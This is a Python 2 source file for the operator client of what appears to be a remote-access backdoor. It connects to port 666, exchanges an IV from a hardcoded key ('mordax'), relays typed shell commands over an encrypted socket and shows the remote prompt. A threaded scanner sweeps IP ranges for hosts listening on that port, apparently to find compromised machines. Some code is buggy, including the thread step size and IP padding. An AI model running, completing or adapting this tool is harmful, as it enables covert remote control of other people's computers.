# This Python file uses the following encoding: utf-8
import socket
import threading
from tqdm import tqdm
import Crypt
import CheckVersion


class Client(Crypt.Crypt, CheckVersion.CheckVersion):
    def __init__(self):
        self.ip2 = "0.0.0.0"
        self.ip_range = "0.0.0.0"

    def connect(self, host):

        state = 1
        port = 666
        timeout = 0

        if host != 0:
            host = host
        else:
            host = raw_input("IP: ")
            host = str(host)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while state:

            try:
                s.connect((host, port))
            except socket.error:
                print("server is offline")
                timeout = timeout+1
                if timeout == 5:
                    return 0
            else:
                state = 0
        iv = self.key_and_iv("mordax", 0)
        s.send(iv)
        text = "<command:>"                                                                         # BLOCK_SIZE = 2048

        while True:

            cmd = raw_input(text)

            if cmd == "close":
                s.send("close")
                s.close()
                exit()

            s.send(self.encode(cmd))
            data = self.decode(s.recv(2048))
            data = data.split(";")

            if data[0] == "SIZE":
                data[1] = int(data[1])
                data2 = s.recv(data[1])
                data2 = data2.split(";")
                print (data2[0])
                text = data2[1] + ">"
            else:
                print (data[0])
                text = self.depad(data[1])
                text = text + ">"

    def scan(self):

        start = raw_input("Start IP: ")
        stop = raw_input("Stop IP: ")
        ip1 = start.split(".")
        self.ip2 = stop.split(".")
        self.ip_range = ip1[0] + "." + ip1[1] + "." + ip1[2] + "."

        thread_0_ip = int(ip1[3])
        thread_1_ip = int(ip1[3]) + 1
        thread_2_ip = int(ip1[3]) + 2
        thread_3_ip = int(ip1[3]) + 3
        thread_4_ip = int(ip1[3]) + 4
        thread_5_ip = int(ip1[3]) + 5
        thread_6_ip = int(ip1[3]) + 6
        thread_7_ip = int(ip1[3]) + 7

        t1 = threading.Thread(target=self.s_scan, args=(thread_0_ip, "0",))
        t2 = threading.Thread(target=self.s_scan, args=(thread_1_ip, "1",))
        t3 = threading.Thread(target=self.s_scan, args=(thread_2_ip, "2",))
        t4 = threading.Thread(target=self.s_scan, args=(thread_3_ip, "3",))
        t5 = threading.Thread(target=self.s_scan, args=(thread_4_ip, "4",))
        t6 = threading.Thread(target=self.s_scan, args=(thread_5_ip, "5",))
        t7 = threading.Thread(target=self.s_scan, args=(thread_6_ip, "6",))
        t8 = threading.Thread(target=self.s_scan, args=(thread_7_ip, "7",))

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
        t7.start()
        t8.start()

    def s_scan(self, strange, thread):
        try:
            stop_range = self.ip2[3]
            step = 9

            for x in tqdm(range(strange, int(stop_range), int(step))):
                if x < 10:
                    x = str(x)
                    x = "0" + x
                elif x >= 10:
                    x = str(x)

                ip = self.ip_range + x

                ip = str(ip)
                print("scanning with thread " + thread + " targeting IP: " + ip + "\n")

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                res = s.connect_ex((ip, 666))

                for timeout in range(0, 5):
                    if res == 0:
                        print (ip + " is online")

        except socket.error as e:
            print(e)
